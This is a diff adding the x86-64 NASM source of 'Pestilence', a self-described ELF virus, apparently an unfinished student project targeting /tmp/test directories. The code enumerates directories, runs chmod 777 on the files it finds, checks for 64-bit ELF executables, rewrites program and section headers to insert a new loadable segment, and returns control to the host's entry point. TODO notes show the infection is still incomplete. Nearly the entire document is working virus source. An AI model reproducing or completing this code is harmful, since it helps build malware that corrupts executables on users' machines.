@@ -1,0 +1,430 @@
+%include "pestilence.inc"
+
+bits 64
+section .text
+default rel
+global _start
+
+_start:
+
+; ##### VIRUS SETUP AND EXIT #####
+
+	; === Saving some registers ===
+	push rdi
+	push rsi
+	push rcx
+	push rdx
+
+	; === Placing the 'famine' struct on the stack ===
+	push rbp
+	mov rbp, rsp
+	sub rsp, famine_size
+
+	; === Loading the address of the directory name string in rdi, and calling _traverse_dir ===
+	lea rdi, [rel target_1]
+	call _traverse_dir
+	lea rdi, [rel target_2]
+	call _traverse_dir
+
+	; === Deleting the 'famine' struct from the stack
+	add rsp, famine_size
+
+	; === Placing original entry point in r15 ===
+	lea r15, [rel _start]
+	mov rsi, [rel virus_entry]
+	sub r15, rsi
+	add r15, [rel host_entry]
+
+	; === Restoring registers and jumping to original entry point ===
+	pop rbp
+	pop rdx
+	pop rcx
+	pop rsi
+	pop rdi
+	jmp r15
+
+
+
+; ##### LOOP THROUGH TARGET DIRECTORIES #####
+
+_traverse_dir:
+	; === Opening the target directory (path address in rdi) | open(dir, O_RDONLY | O_DIRECTORY, 0) ===
+	mov r12, rdi												; Saving name of directory in r12
+	mov rsi, O_RDONLY | O_DIRECTORY
+	xor rdx, rdx
+	mov rax, SYS_OPEN
+	syscall
+	mov dword FAM(famine.dir_fd), eax
+	cmp rax, 0
+	jl _return
+
+	; === Calling getdents to get content of directory | getdents(dir_fd, struc linux_dirent *dirp, count) ===
+	mov rdi, rax												; rax has the fd of the "open" call on directory
+	lea rsi, FAM(famine.dirents)								; We will store the dirents structure in our 'famine' structure
+	mov rdx, DIRENTS_BUFF_SIZE
+	mov rax, SYS_GETENTS
+	syscall
+	cmp rax, 0
+	jl .end_dir_loop
+	mov r15, rax												; r15 will keep the total size of the dirents structure read by the syscall
+
+	; === Initializing total_dreclen to 0 ===
+	xor r8, r8
+	mov FAM(famine.total_dreclen), r8
+
+	; === Loop iterating through every entries of current directory ===
+	.list_dir:
+	xor r14, r14											; r14 will store d_reclen of current dirent
+	lea rsi, FAM(famine.dirents)							; rsi will be used to navigate current dirent, and ultimatly store d_name
+	add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
+	mov r13, rsi											; r13 will store d_type of current dirent
+	add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
+	mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
+	add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
+	add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
+	sub r14, 1
+	add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
+	movzx r13, byte [r13]									; r13 has d_type value
+
+	cmp r13, 0x8											; If type is 0x8 (regular file), handle the file ; else, continue the loop
+	je _file
+	.check_dir_loop:
+	cmp qword FAM(famine.total_dreclen), r15				; r15 has total size of the dirents structure (not used in file infection)
+	jge .end_dir_loop										; If we already read this size, we finished iterating over entries of directory.
+	jmp _traverse_dir.list_dir								; Else, we continue the loop
+
+	; === Closing the directory when we're done ===
+	.end_dir_loop:
+	movzx rdi, word FAM(famine.dir_fd)
+	mov rax, SYS_CLOSE
+	syscall
+	ret
+
+
+
+; ##### FILE INFECTION #####
+
+_file:
+	mov qword FAM(famine.map_ptr), 0
+	; === Concatenating the directory name and the filename ===
+	push rsi													; rsi has filename address. Save it on stack
+	lea rdi, FAM(famine.current_fpath)							; We will store the complete path in our 'famine' structure
+	mov rsi, r12												; r12 has directory name. 
+	mov rdx, rdi												; Saving the complete file path address in rdx
+
+	.dir:														; Copy the directory name to 'famine' structure
+	movsb
+	cmp byte [rsi], 0
+	jne .dir
+	pop rsi														; Put the filename in rsi
+	.fname:														; Copy the filename to 'famine' structure and the terminating NULL BYTE
+	movsb
+	cmp byte [rsi - 1], 0
+	jne .fname
+
+	; === chmod 777 on the file to infect, to ensure we have read-write permissions on it ===
+	lea rdi, FAM(famine.current_fpath)
+	mov rsi, 0q0777
+	mov rax, SYS_CHMOD
+	syscall
+
+	; === Opening the file to infect | open(fpath, O_RDWR, 0)
+	mov rdi, rdx												; rdx had the complete file path address
+	mov rax, SYS_OPEN
+	mov rsi, O_RDWR
+	xor rdx, rdx
+	syscall
+	mov r8, rax													; Storing the file fd in r8 (in preparation of mmap calls)
+	cmp rax, 0
+	jl _traverse_dir.check_dir_loop
+
+	; === Opening the outfile ===
+	lea rdi, [rel outf]
+	mov rax, SYS_OPEN
+	mov rsi, O_RDWR | O_CREAT | O_TRUNC
+	mov rdx, S_IRWXU | S_IRWXG | S_IRWXO
+	syscall
+	mov FAM(famine.outf_fd), rax								; Storing the outfile fd in 'famine' structure
+	cmp rax, 0
+	jl _traverse_dir.check_dir_loop
+
+	; === Calculate the size of the target file | lseek(file_fd, 0, SEEK_END) ===
+	mov rdi, r8
+	xor rsi, rsi
+	mov rdx, SEEK_END
+	mov rax, SYS_LSEEK
+	syscall
+	mov FAM(famine.fsize), rax									; Saving original file size in 'famine' structure
+	mov FAM(famine.mmap_size), rax
+	cmp rax, 4
+	jl _end_file_infection
+
+	; === mmap to read the file | mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0) ===
+	xor rdi, rdi
+	mov rsi, rax
+	mov rdx, PROT_READ | PROT_WRITE
+	mov r10, MAP_PRIVATE
+	xor r9, r9
+	mov rax, SYS_MMAP
+	syscall
+	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in 'famine' structure
+	cmp rax, 0
+	jl _end_file_infection
+
+	; === Making sure the file is an ELF file ===
+	mov rax, FAM(famine.map_ptr)
+	cmp dword [rax], 0x464c457f
+	jne _end_file_infection
+
+	; === Making sure the ELF file is x64 ===
+	cmp byte [rax + 0x4], 0x2
+	jne _end_file_infection
+
+	; === Making sure the ELF file is ET_EXEC or ET_DYN ===
+	cmp word [rax + 0x10], 0x2
+	je .parse
+	cmp word [rax + 0x10], 0x3
+	je .parse
+	jmp _end_file_infection
+
+	; === Parsing some original file informations ===
+	.parse:
+	add rax, elf64_ehdr.e_phoff													; Getting original e_phoff
+	mov rdi, [rax]
+	mov FAM(famine.e_phoff), rdi
+	add rax, elf64_ehdr.e_shoff - elf64_ehdr.e_phoff							; Getting original e_shoff
+	mov rdi, [rax]
+	mov FAM(famine.e_shoff), rdi
+	add rax, elf64_ehdr.e_phnum - elf64_ehdr.e_shoff							; Getting original e_phnum
+	movzx rdi, word [rax]
+	mov FAM(famine.e_phnum), rdi
+	add rax, elf64_ehdr.e_shnum - elf64_ehdr.e_phnum							; Getting original e_shnum
+	movzx rdi, word [rax]
+	mov FAM(famine.e_shnum), rdi
+
+	mov r11, FAM(famine.e_phoff)
+	movzx rax, word FAM(famine.e_phnum)											; Getting offset for start of sections in original file
+	mov rdi, elf64_phdr_size
+	mul rdi
+	add rax, r11
+	mov FAM(famine.sec_start_off), rax
+
+	; === Patching segments ===
+_debug:
+	mov r11, FAM(famine.e_phoff)
+	mov r13, FAM(famine.sec_start_off)
+	movzx r14, word FAM(famine.e_phnum)
+	xor r10, r10
+	mov rax, FAM(famine.map_ptr)
+	add rax, r11
+
+	.patch_segments:
+	mov rdi, rax
+	cmp dword [rdi], 0x6
+	je _patch_PHDR_segment
+
+;	cmp dword [rdi], 0x3
+;	je _patch_interp_segment
+
+	add rdi, elf64_phdr.p_offset
+	mov rsi, [rdi]
+	cmp r13, rsi
+	jg .pass
+	add qword [rdi], elf64_phdr_size
+	.pass:
+	inc r10
+	cmp r10, r14
+	je .sections
+	add rax, elf64_phdr_size
+	jmp .patch_segments
+
+	; === Patching all section header offsets in file ===
+	.sections:
+	mov r11, FAM(famine.e_shoff)												; r11 stores e_shoff
+	movzx r14, word FAM(famine.e_shnum)											; r14 stores e_shnum
+	xor r10, r10																; r10 will be our counter
+	inc r10
+
+	mov rax, FAM(famine.map_ptr)
+	add rax, r11																; We're at the start of section headers in the mapping
+	add rax, elf64_shdr_size													; Starting at the 2nd section header, leaving the first
+	add qword [rdi], elf64_phdr_size
+
+
+	.patch_sections:
+	mov rdi, rax
+	add rdi, elf64_shdr.sh_offset
+	add qword [rdi], elf64_phdr_size											; We add size of phdr header to their offset, since their content will be shifted
+	inc r10
+	cmp r10, r14
+	je .patch_elf_header
+	add rax, elf64_shdr_size
+	jmp .patch_sections
+
+	; === Patching the elf header (e_phnum and e_shoff)
+	.patch_elf_header:
+	mov rax, FAM(famine.map_ptr)
+	add rax, elf64_ehdr.e_shoff
+	add qword [rax], elf64_phdr_size											; Adding size of new phdr header
+	add rax, elf64_ehdr.e_phnum - elf64_ehdr.e_shoff
+	inc word [rax]																; Adding 1 to segment header count
+
+
+	; === Writing the whole beginning of file until end of program headers : e_phoff + (e_phnum * elf64_phdr_size) ===
+	.segments:
+	mov rdx, FAM(famine.sec_start_off)
+	mov rax, SYS_WRITE
+	mov rdi, FAM(famine.outf_fd)
+	mov rsi, FAM(famine.map_ptr)
+	syscall
+
+	; === Creating our new program header ===
+	lea rax, FAM(famine.new_phdr)
+	mov dword [rax], 0x4									; p_type is PT_LOAD
+	add rax, elf64_phdr.p_flags
+	mov dword [rax], 0x4										; p_flags is R E
+	add rax, elf64_phdr.p_offset - elf64_phdr.p_flags
+	mov qword [rax], 0x28c										; p_offset (for the moment, 0)
+	add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
+	mov qword [rax], 0x400298										; p_vaddr (for the moment, 0)
+	add rax, elf64_phdr.p_paddr - elf64_phdr.p_vaddr
+	mov qword [rax], 0x400298									; p_paddr (for the moment, 0)
+	add rax, elf64_phdr.p_filesz - elf64_phdr.p_paddr
+	mov qword [rax], 0x44										; p_filesz, 4096 bytes
+	add rax, elf64_phdr.p_memsz - elf64_phdr.p_filesz
+	mov qword [rax], 0x44										; p_memsz, 4096 bytes
+	add rax, elf64_phdr.p_align - elf64_phdr.p_memsz
+	mov qword [rax], 0x4										; p_align, 0x1000
+
+	; === Writing our new program header to file ===
+	mov rax, SYS_WRITE
+	mov rdi, FAM(famine.outf_fd)
+	lea rsi, FAM(famine.new_phdr)
+	mov rdx, elf64_phdr_size
+	syscall
+
+	; === Writing all the sections of the original file ===
+	mov rax, SYS_WRITE
+	mov rdi, FAM(famine.outf_fd)
+	mov rsi, FAM(famine.map_ptr)
+	add rsi, FAM(famine.sec_start_off)
+
+	mov r11, FAM(famine.e_shoff)								; r11 has original e_shoff
+	mov rdx, FAM(famine.map_ptr)
+	add rdx, r11
+	sub rdx, rsi
+	syscall
+
+
+	; === Writing 4096 'A' to simulate new section ===
+
+
+
+	; === Writing section headers ===
+	movzx rax, word FAM(famine.e_shnum)
+	mov rdi, elf64_shdr_size
+	mul rdi
+	mov rdx, rax
+
+	mov rax, SYS_WRITE
+	mov rdi, FAM(famine.outf_fd)
+	mov rsi, FAM(famine.map_ptr)
+	add rsi, FAM(famine.e_shoff)
+	
+	syscall
+
+
+	jmp _end_file_infection
+
+
+
+_end_file_infection:
+	.munmap:
+	mov rdi, FAM(famine.map_ptr)
+	cmp rdi, 0													; If we don't have any file mapping yet, just close the file
+	je .close_file
+	mov rsi, FAM(famine.mmap_size)
+	mov rax, SYS_MUNMAP
+	syscall
+	.close_file:
+	mov rdi, r8
+	mov rax, SYS_CLOSE
+	syscall
+	jmp _traverse_dir.check_dir_loop
+
+
+
+
+
+
+
+_text_seg_header_patch:
+	; === Increasing text segment header p_filesz and p_memsz of VIRUS_SIZE ===
+	; [PESTILENCE] : We will simply increase the same values for the last loadable segment. We should also make it RWE
+	mov rax, FAM(famine.map_ptr)
+;	add rax, FAM(famine.seg_header)
+
+	add rax, elf64_phdr.p_flags
+	mov dword [rax], 7												; p_flags = RWE
+
+	add rax, elf64_phdr.p_filesz - elf64_phdr.p_flags			; p_filesz += VIRUS_SIZE
+	mov rdi, [rax]
+	add rdi, VIRUS_SIZE
+	mov [rax], rdi
+	add rax, elf64_phdr.p_memsz - elf64_phdr.p_filesz			; p_memsz += VIRUS_SIZE
+	mov rdi, [rax]
+	add rdi, VIRUS_SIZE
+	mov [rax], rdi
+	ret
+
+_check_loadable:
+	mov rsi, rax												; rax has the address of p_type
+	cmp dword [rsi], 0x1
+	jne _return													; If the segment type isn't PT_LOAD, this isn't the text segment
+	mov r12, rax												; Else, we store its address in r12
+	jmp _return
+
+_patch_PHDR_segment:
+	add rdi, elf64_phdr.p_filesz
+	add qword [rdi], elf64_phdr_size
+	add rdi, elf64_phdr.p_memsz - elf64_phdr.p_filesz
+	add qword [rdi], elf64_phdr_size
+
+	jmp _debug.pass
+
+_patch_interp_segment:
+	mov rsi, rdi
+	add rsi, elf64_phdr.p_vaddr
+	add qword [rsi], elf64_phdr_size
+
+	add rdi, elf64_phdr.p_offset
+	mov rsi, [rdi]
+	cmp r13, rsi
+	jg _debug.pass
+	add qword [rdi], elf64_phdr_size
+	jmp _debug.pass
+
+
+_return:
+	ret
+
+_exit:
+	mov rax, SYS_EXIT
+	mov rdi, 0
+	syscall
+
+target_1	db		"/tmp/test/",0x0
+target_2	db		"/tmp/test2/",0x0
+outf		db		"/tmp/out",0x0
+signature	db		"Pestilence version 1.0 (c)oded by qroland",0x0
+host_entry	dq		_exit
+virus_entry	dq		_start
+_finish:
+
+
+
+; TODO :
+; > Re-check the correct closing of fd and munmapping of maps
+; > Write the beginning of file AFTER patching the elf header
+; > Didn't patch the segment offsets in file yet : add 56 to PHDR segment size
+; > Patch INTERP segment offset too
